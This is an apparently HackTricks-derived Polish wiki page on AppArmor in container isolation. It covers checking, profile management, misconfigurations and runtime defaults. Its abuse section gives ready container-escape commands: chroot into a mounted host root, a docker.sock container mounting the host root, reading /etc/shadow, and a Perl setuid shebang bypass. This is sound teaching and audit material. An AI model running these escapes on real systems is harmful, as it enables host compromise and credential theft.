# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Przegląd

AppArmor to system **Obowiązkowej kontroli dostępu**, który stosuje ograniczenia za pomocą profili przypisanych do poszczególnych programów. W przeciwieństwie do tradycyjnych kontroli DAC, które w dużej mierze zależą od własności użytkownika i grupy, AppArmor pozwala jądru egzekwować politykę przypisaną bezpośrednio do procesu. W środowiskach kontenerowych ma to znaczenie, ponieważ workload może mieć wystarczające tradycyjne uprawnienia, aby spróbować wykonać pewną akcję, a mimo to zostać zablokowany, jeśli jego profil AppArmor nie pozwala na dany path, mount, zachowanie sieciowe lub użycie capability.

Najważniejszym punktem koncepcyjnym jest to, że AppArmor jest **oparty na ścieżkach**. Ocenia dostęp do systemu plików przez reguły oparte na ścieżkach, a nie przez etykiety, jak robi to SELinux. Dzięki temu jest przystępny i potężny, ale oznacza to też, że bind mounts oraz alternatywne układy ścieżek wymagają ostrożnej uwagi. Jeśli ta sama zawartość hosta stanie się dostępna pod inną ścieżką, efekt polityki może nie być taki, jak operator początkowo oczekiwał.

## Rola w izolacji kontenerów

Przeglądy bezpieczeństwa kontenerów często zatrzymują się na capabilities i seccomp, ale AppArmor nadal ma znaczenie po tych kontrolach. Wyobraź sobie kontener, który ma więcej uprawnień niż powinien, lub workload, który potrzebował dodatkowej capability ze względów operacyjnych. AppArmor nadal może ograniczać dostęp do plików, zachowanie mountów, networking i wzorce wykonywania w sposób, który blokuje oczywistą ścieżkę nadużyć. Dlatego wyłączenie AppArmor „tylko po to, żeby aplikacja działała” może cicho przekształcić jedynie ryzykowną konfigurację w taką, którą można aktywnie wykorzystać.

## Laboratorium

Aby sprawdzić, czy AppArmor jest aktywny na hoście, użyj:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Aby zobaczyć, pod czym uruchomiony jest bieżący proces kontenera:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Różnica jest pouczająca. W normalnym przypadku proces powinien pokazywać kontekst AppArmor powiązany z profilem wybranym przez runtime. W przypadku unconfined ta dodatkowa warstwa ograniczeń znika.

Możesz też sprawdzić, co Docker uważa, że zastosował:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Użycie w czasie działania

Docker może stosować domyślny lub niestandardowy profil AppArmor, jeśli host to obsługuje. Podman może także integrować się z AppArmor na systemach opartych na AppArmor, chociaż na dystrybucjach, w których priorytet ma SELinux, inny system MAC często odgrywa główną rolę. Kubernetes może udostępniać politykę AppArmor na poziomie workloadu na węzłach, które faktycznie obsługują AppArmor. LXC i pokrewne środowiska system-container z rodziny Ubuntu również szeroko korzystają z AppArmor.

Praktyczny wniosek jest taki, że AppArmor nie jest "funkcją Dockera". To cecha jądra hosta, którą mogą zastosować różne środowiska uruchomieniowe. Jeśli host jej nie obsługuje lub runtime został uruchomiony jako unconfined, domniemana ochrona w rzeczywistości nie istnieje.

Na hostach z AppArmor, które obsługują Docker, najpowszechniejszym profilem domyślnym jest `docker-default`. Ten profil jest generowany z szablonu AppArmor Moby i ma znaczenie, ponieważ tłumaczy, dlaczego niektóre PoC-y oparte na capability wciąż zawodzą w domyślnym kontenerze. W dużym skrócie, `docker-default` pozwala na zwykłe operacje sieciowe, zabrania zapisu do dużej części `/proc`, odmawia dostępu do wrażliwych części `/sys`, blokuje operacje montowania oraz ogranicza ptrace, aby nie był ogólnym prymitywem do sondowania hosta. Zrozumienie tego punktu odniesienia pomaga rozróżnić "the container has `CAP_SYS_ADMIN`" od "the container can actually use that capability against the kernel interfaces I care about".

## Zarządzanie profilami

AppArmor profiles are usually stored under `/etc/apparmor.d/`. A common naming convention is to replace slashes in the executable path with dots. For example, a profile for `/usr/bin/man` is commonly stored as `/etc/apparmor.d/usr.bin.man`. This detail matters during both defense and assessment because once you know the active profile name, you can often locate the corresponding file quickly on the host.

Przydatne polecenia do zarządzania po stronie hosta to:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Powód, dla którego te polecenia mają znaczenie w odniesieniu do container-security, jest taki, że wyjaśniają, jak profile są faktycznie budowane, ładowane, przełączane na complain mode i modyfikowane po zmianach w aplikacji. Jeśli operator ma zwyczaj przenoszenia profili do complain mode podczas rozwiązywania problemów i zapomina przywrócić egzekwowanie, kontener może wyglądać na chroniony w dokumentacji, podczas gdy w rzeczywistości zachowuje się znacznie luźniej.

### Budowanie i aktualizowanie profili

`aa-genprof` może obserwować zachowanie aplikacji i pomóc interaktywnie wygenerować profil:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` może wygenerować szablon profilu, który później można załadować za pomocą `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Gdy plik binarny się zmieni i polityka wymaga aktualizacji, `aa-logprof` może odtworzyć odmowy znalezione w logach i pomóc operatorowi zdecydować, czy je dopuścić, czy zablokować:
```bash
sudo aa-logprof
```
### Logi

Odmowy AppArmor są często widoczne w `auditd`, syslogu lub w narzędziach takich jak `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Jest to użyteczne operacyjnie i ofensywnie. Obrońcy używają tego do dopracowywania profili. Atakujący używają tego, aby dowiedzieć się, która dokładnie ścieżka lub operacja jest odrzucana oraz czy AppArmor jest mechanizmem blokującym exploit chain.

### Identyfikacja dokładnego pliku profilu

Gdy runtime pokazuje konkretną nazwę profilu AppArmor dla containera, często przydatne jest zmapowanie tej nazwy do pliku profilu na dysku:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Jest to szczególnie przydatne podczas przeglądu po stronie hosta, ponieważ wypełnia lukę między „kontener twierdzi, że działa pod profilem `lowpriv`” a „rzeczywiste reguły znajdują się w tym konkretnym pliku, który można audytować lub przeładować”.

## Nieprawidłowe konfiguracje

Najbardziej oczywistym błędem jest `apparmor=unconfined`. Administratorzy często ustawiają go podczas debugowania aplikacji, która zawiodła, ponieważ profil poprawnie zablokował coś niebezpiecznego lub nieoczekiwanego. Jeśli flaga pozostanie w środowisku produkcyjnym, cała warstwa MAC zostaje w praktyce usunięta.

Kolejnym subtelnym problemem jest założenie, że bind mounts są nieszkodliwe, ponieważ uprawnienia plików wyglądają normalnie. Ponieważ AppArmor opiera się na ścieżkach, eksponowanie ścieżek hosta pod alternatywnymi punktami montowania może źle współdziałać z regułami opartymi na ścieżkach. Trzecim błędem jest zapomnienie, że nazwa profilu w pliku konfiguracyjnym niewiele znaczy, jeśli jądro hosta faktycznie nie egzekwuje AppArmor.

## Nadużycia

Gdy AppArmor nie działa, operacje wcześniej ograniczone mogą nagle zacząć działać: odczyt wrażliwych ścieżek przez bind mounts, dostęp do części procfs lub sysfs, które powinny pozostać trudniejsze w użyciu, wykonywanie operacji związanych z montowaniem, jeśli capabilities/seccomp również na to pozwalają, lub korzystanie ze ścieżek, które profil normalnie by zablokował. AppArmor często tłumaczy, dlaczego próba breakout oparta na capability „powinna działać” na papierze, a mimo to zawodzi w praktyce. Usuń AppArmor, a ta sama próba może zacząć działać.

Jeśli podejrzewasz, że AppArmor jest główną przeszkodą dla path-traversal, bind-mount, lub mount-based abuse chain, pierwszym krokiem zazwyczaj jest porównanie tego, co staje się dostępne z profilem i bez niego. Na przykład, jeśli ścieżka hosta jest zamontowana wewnątrz kontenera, zacznij od sprawdzenia, czy możesz po niej przejść i odczytać ją:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Jeśli kontener ma także niebezpieczne uprawnienie, takie jak `CAP_SYS_ADMIN`, jednym z najbardziej praktycznych testów jest sprawdzenie, czy to AppArmor jest mechanizmem blokującym operacje montowania lub dostęp do wrażliwych systemów plików jądra:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
W środowiskach, w których ścieżka hosta jest już dostępna przez bind mount, utrata AppArmor może również zamienić błąd ujawniania informacji tylko do odczytu w bezpośredni dostęp do plików hosta:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
The point of these commands is not that AppArmor alone creates the breakout. It is that once AppArmor is removed, many filesystem and mount-based abuse paths become testable immediately.

### Pełny przykład: AppArmor wyłączony + root hosta zamontowany

Jeśli kontener ma już root hosta bind-mounted pod `/host`, usunięcie AppArmor może zamienić zablokowaną ścieżkę nadużyć systemu plików w pełny host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Gdy shell działa przez host filesystem, workload skutecznie wydostał się poza container boundary:
```bash
id
hostname
cat /etc/shadow | head
```
### Pełny przykład: AppArmor wyłączony + Runtime Socket

Jeśli prawdziwą barierą był AppArmor wokół runtime state, zamontowany socket może wystarczyć do complete escape:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Dokładna ścieżka zależy od punktu montowania, ale efekt końcowy jest ten sam: AppArmor nie zapobiega już dostępowi do runtime API, a runtime API może uruchomić host-compromising container.

### Pełny przykład: Path-Based Bind-Mount Bypass

Ponieważ AppArmor jest oparty na ścieżkach, ochrona `/proc/**` nie chroni automatycznie tej samej zawartości procfs hosta, gdy jest ona osiągalna przez inną ścieżkę:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Wpływ zależy od tego, co dokładnie jest zamontowane i czy alternatywna ścieżka również omija inne mechanizmy kontroli, ale ten wzorzec jest jedną z najjaśniejszych przyczyn, dla których AppArmor musi być oceniany razem z układem punktów montowania, a nie w izolacji.

### Pełny przykład: Shebang Bypass

Polityka AppArmor czasami celuje w ścieżkę interpretera w sposób, który nie uwzględnia w pełni wykonywania skryptów przez obsługę shebang. Historyczny przykład polegał na użyciu skryptu, którego pierwsza linia wskazuje na ograniczony interpreter:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Tego typu przykład przypomina, że intencja profilu i rzeczywista semantyka wykonania mogą się rozjechać. Przy przeglądzie AppArmor w środowiskach kontenerowych łańcuchy interpreterów i alternatywne ścieżki wykonania zasługują na szczególną uwagę.

## Sprawdzenia

Celem tych sprawdzeń jest szybkie odpowiedzenie na trzy pytania: czy AppArmor jest włączony na hoście, czy bieżący proces jest ograniczony, oraz czy runtime faktycznie zastosował profil do tego kontenera?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Co jest tutaj interesujące:

- Jeśli `/proc/self/attr/current` pokazuje `unconfined`, aplikacja uruchomiona w kontenerze nie korzysta z ograniczeń AppArmor.
- Jeśli `aa-status` pokazuje, że AppArmor jest wyłączony lub nie załadowany, każda nazwa profilu w konfiguracji runtime ma w większości charakter kosmetyczny.
- Jeśli `docker inspect` pokazuje `unconfined` lub niespodziewany niestandardowy profil, często to jest powód, dla którego działa ścieżka nadużycia oparta na systemie plików lub montowaniu.

Jeśli kontener ma już podniesione uprawnienia ze względów operacyjnych, pozostawienie AppArmor włączonego często decyduje o tym, czy będzie to kontrolowany wyjątek, czy znacznie szersza awaria bezpieczeństwa.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Włączony domyślnie na hostach obsługujących AppArmor | Używa profilu AppArmor `docker-default`, chyba że zostanie nadpisany | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Zależny od hosta | AppArmor jest wspierany przez `--security-opt`, ale dokładny domyślny stan zależy od hosta/runtime i jest mniej uniwersalny niż udokumentowany przez Docker profil `docker-default` | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Warunkowy domyślny stan | Jeśli `appArmorProfile.type` nie jest określone, domyślnie jest `RuntimeDefault`, ale jest ono stosowane tylko wtedy, gdy AppArmor jest włączony na węźle | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` z słabym profilem, węzły bez wsparcia AppArmor |
| containerd / CRI-O under Kubernetes | Zależy od wsparcia węzła/runtime | Typowe runtime'y wspierane przez Kubernetes obsługują AppArmor, ale faktyczne egzekwowanie wciąż zależy od wsparcia węzła i ustawień obciążenia | Tak jak w wierszu Kubernetes; bezpośrednia konfiguracja runtime może również całkowicie pominąć AppArmor |

Dla AppArmor najważniejszą zmienną jest często **host**, nie tylko runtime. Ustawienie profilu w manifeście nie tworzy ograniczenia na węźle, gdzie AppArmor nie jest włączony.
{{#include ../../../../banners/hacktricks-training.md}}
